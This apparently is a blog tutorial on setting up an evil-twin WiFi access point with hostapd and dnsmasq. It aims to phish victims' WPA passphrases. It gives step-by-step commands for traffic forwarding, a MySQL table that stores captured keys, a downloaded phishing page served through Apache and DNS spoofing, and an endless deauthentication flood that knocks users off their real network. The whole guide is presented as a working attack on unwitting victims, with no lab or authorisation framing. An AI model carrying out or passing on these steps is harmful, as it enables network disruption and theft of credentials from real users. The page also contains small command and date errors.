---
title: Setup Fake (Rogue) Access Point WiFi using HostAPD
tags:  
categories:
  - wireless
  - rogue-ap
summary: A detailed guide on how to setup a rogue or fake access point wifi network using hostapdo  
created: 2024-08-25
lastmod: 2023-08-25
image: https://github.com/user-attachments/assets/471e01a7-df63-414e-9370-6b8deafe6686
---

**In this guide, i'll try my best to explain how one can use Fake (Rogue) Access Point to phish passphrases and other important target details over the air by showing targets a fabricated document. We will using using hostapd, a well-written ad-hoc software. A Rogue (Fake) Access Point is hosted to tempt and influence users to add their details on some page.**

As this rogue network is under the control of attacker, this allows him to stage several types of attacks against the nodes.

Wireless protocols are greatly enhanced since 2003 after the evolution of WPA in the reign of WiFi protected Access. A Fake Access Point is simply a wireless network possessing most of the attributes, the target network comprised of. The more it looks factual and discharge strong signal strength over a reasonable distance, the more possibility there will exist of getting that particular task done.

![rogueap](https://github.com/user-attachments/assets/7d5cf4dc-127e-4495-8ff5-13f9b39c80b6)

## Technical Terms
### Phishing
Coerce or influence someone to perform unintentional tasks by showing a forged document or a falsified page is said to be the phishing way.

### Wireless Adapter
A perfect wireless adapter is the foremost neccassity of a fake wireless network. A card with support of promiscious mode and packet injection is required to operate it in monitor mode and send forged packets over the area. Another important thing is to operate it at a suplemental frequency though its not compulsory if the victim is roughly close to you. The Recommended one are:

  * Alfa AWUSO36NH (Recommended, you can the change frequency)
  * TP-Link WN722N (Nice, doesn't allow to change frequency, works fine with hostapd)
  * Panda 300Mbps (Slow speed, but provides great distance. Not so best)
 
### Is it Effective?
As have already discussed, it's effictiveness depend on illegitimacy of it's structure and how it is desgined. The more it looks factual and authentic, the more coercive attack it will be.

## The Guide
### Setup Environment
Before, we take a head-start, this tutorial is written on the basis of Kali Rolling 2018.1 as the attacker OS while any other platform could be taken as a choice of victim.

Update the environment and install required packages. This will install hostapd and dnsmasq and will update apache2 web server.
```bash
sudo apt update
sudo apt install hostapd dnsmasq apache2
```
![update](https://github.com/user-attachments/assets/e0534b03-4cbc-4794-9b16-6dd34d353a4b)


### Wireless Interface
Get your wireless interface
```bash
ifconfig
```
![iwconfig](https://github.com/user-attachments/assets/8e8e9a29-9194-40ce-9311-c5e7a05e032c)


Find the adapter interface and put it in monitor mode. In my case the wireless interface is wlan1 as shown in the above screenshot. So,
```bash
airmon-ng start wlan1
```
![airmon](https://github.com/user-attachments/assets/608e513e-4ac1-4215-83b1-4f974ca1e6f3)

### Fake / Rogue Access Point
Now, create a new folder under the home directory for the network files and navigate to that directory. For now, let's say fakeap is the directory.
```bash
mkdir /root/fakeap
cd /root/fakeap
```

Setup a new hostapd configuration file and write the following instructions into the file:
```bash
nano hostapd.conf
```

```bash
interface=wlan1mon
driver=nl80211
ssid=[Fake AP Name] 
hw_mode=g
channel=[Fake AP Channel]
macaddr_acl=0
ignore_broadcast_ssid=0
```

Press CTRL+X and then y to it. Note these three parameters in the above configuration:

* `interface`: Monitor mode Wireless Interface to use.
* `ssid`: Fake Access Point ESSID (name).
* `channel`: Fake AP Channel to operate on.

Now, just initiate the fake access point:
```bash
hostapd hostapd.conf
```

![hostapd](https://github.com/user-attachments/assets/0e50cbad-cc22-442e-aba1-3a05e0d53744)

### Multiple Access Points (Optional)
If you have multiple targets or you are willing to write a script for multiple targets, hostapd provides this support too. You can provide multiple virtual interfaces to operate multiple networks from a single wireless card at a time. Tough it would slow down the whole process and would cause some other network problems. The standard usage of this is to host 3 networks from a single card at a time.

```bash
interface=wlan1mon
hw_mode=g
channel=6
country_code=US

#FIRSTAP
ssid=ap1
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK 
rsn_pairwise=TKIP
wpa_passphrase=somepassword

#SECONDAP
bss=wlan2    # Interface for secondap
ssid=ap2
```

<quote>Make Sure to remove the comments from the configuration provided above or it will throw a syntax error.</quote>

### DHCP
We have dnsmasq for this part. dnsmasq is a Dynamic Host Configuration Protocol (DHCP) server, with support of dns forwarder and some other network features. It certainly is fast and easier to modify. Open a new terminal and create a configuration file for dnsmasq.

```bash
nano dnsmasq.conf
```

```bash
interface=wlan1mon
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```

**Note these paramters in the above instructions.**

* `dhcp-range`: IP Range for network clients. 12h is the lease time.
* `dhcp-option=3`: Gateway IP for the networks.
* `dhcp-option=6`: DNS Server.
* `listen-address`: Bind DHCP to local IP.

Assign the network Gateway and netmask to the interface and add the routing table.

```bash
ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```

Now, start dnsmasq server protocol.
```bash
dnsmasq -C dnsmasq.conf -d
```

![dnsmasq](https://github.com/user-attachments/assets/540ae2f1-4855-499f-a783-86ce15f03d28)

### Traffic Forwarding
Here, we will forward traffic from one interface to another, just in case you are eager to provide your victims Internet Access. This would help you perform various other Man-in-the-middel (MITM) attacks and hence, will increase the scope of your attack. After this, it would work most likely a functional wireless access point.

```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan1mon -j ACCEPT
```

Note these two parameters in the last two commands:

* `--out-interface`: interface from where to forward traffic to wlan1mon, i.e eth0
* `--in-interface`: Interface to which traffic is being forwarded, i.e. wlan1mon

Now, just one step to go..

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### MySQL Storage
Now, we are required a site storage to store what's posted along the headers in the form fields. In the aireplay tutorial of setting up Rogue Access Point, we used a different approach to get the credentials. In fact, we sniffed the traffic travelling between the server and client to acheive our aim. But that didn't store the password permanently. An alternative approach of that is using database. So, we will use MySQL. Open MySQL and execute the below commands blind-folded.
```bash
mysql
```
```bash
mysql> create database rogueap;
mysql> create user rogueuser;
mysql> grant all on rogueap.* to 'rogueuser'@'localhost' identified by 'roguepassword';
mysql> use rogueap;
mysql> create table wpa_keys(password1 varchar(30), password2 varchar(30));
mysql> ALTER DATABASE rogueap CHARACTER SET 'utf8';
```

What exactly happened back in the previous commands in short is:

* A new database is created.
* This database is assigned a user who can write data under the influence of password.
* A data table is created to store the required fields.

When, the data from a user will be posted to server, whatever will be entered in those fields which we will see how in the subsequent steps, will be saved in this database table. Then after that you can check for table changes:

```bash
mysql> select * from wpa_keys;
```

![emptykeys](https://github.com/user-attachments/assets/4308411c-8f65-40ee-8746-639fd2e0f8b4)


### Phishing Site
Now, we are required a phishing site, a falsified page or a forged document, basically a web document to induce a user to enter his WiFi passphrase in the document fields. You better want to create your own. But for now, let just download this one:
```bash
wget https://github.com/user-attachments/files/16739611/rogueap.zip
```

Extract the zip file which will give you a new folder rogueap.
```bash
unzip rogueap.zip
```

Remove all the current files under /var/www/html and move all rogueap files to this directory
```bash
rm -rf /var/www/html/*
mv rogueap/* /var/www/html/
```

### Apache and MySQL
Start Apache2 and MySQL Services:
```bash
service apache2 start
service mysql start
```

The main logic behind password storage is placed under the file dbconnect.php which is by now located under /var/www/html/ directory. Go on and open that file:
```bash
nano /var/www/html/dbconnect.php
```
![database](https://github.com/user-attachments/assets/d7bfc38f-670b-4eaa-a8e9-9e5167166605)


Note, the highlighted fields in the above picture. This is where database credentials are defined. It means if you mess with database configuration, you have to alter this file too or vice virsa.

Now, just redirect the network traffic to Gateway IP where our forged document is located:
```bash
dnssnoof -i wlan1mon
```
![dnsspoof](https://github.com/user-attachments/assets/84e840ec-f275-4daa-a715-058c94f1ff79)

<quote>
If until yet everything works, open the link 192.168.1.1 in your browser and see if the document is available. If it is, then try once entering any value in the fields and check in the database terminal if changes are commited.
</quote>

### Deauthentication
This is another compliment to this attack. We will forcely disconnect the victims from the real network, so they would connect the forged network. For this, we will create an infinite loop of deauthentication packets for the target network.

```bash
aireplay-ng -00 -a BD:88:E8:7D:D8:F8 wlan2mon
```

Note the paramters:

* `BD:88:E8:7D:D8:F8` MAC Address of target wireless network
* `wlan2mon: Interface` from which to send disconnection packets.

![aireplay](https://github.com/user-attachments/assets/06999138-0a1d-4d46-a3e8-78455c8f800f)

The question arises here. Is it necassery to buy another wireless card to do this? No, you can use the same adapter for this part too. Just make sure that the wireless card doesn't change operating channel while dispatching packets which is by default in this case. Well, it's not always works. So, it's better to use another wireless adapter for this.

### Credentials
Let's play the victim role. When a victim after deauthentication connects to forged network, he will inevitably put himself into a situation where he will give away his password for the sake of internet usage. Well, as soon he sees our fake page and enter the passphrase in document fields, changes in database will be commited and we will get the password on fly.

So, come back to MySQL terminal and again check any changes to database:

```bash
mysql> select * from wpa_keys;
```

![wpakeys](https://github.com/user-attachments/assets/711722d8-80c5-4448-8baf-273f6ec91923)

From this we be able to know that the password is p@ssword123.

## Conclusion
We have seen to setup a fake access point to harvest potential data over the air. At first, we launched the AP base using hostapd, then we assgined the network some IP parameters and added some routing rules for traffic settlement. Then we seen to forward Internet for enhancing the phishing process. And at the end, we setup the Phishing site via apache Web Server and MySQL storage server.
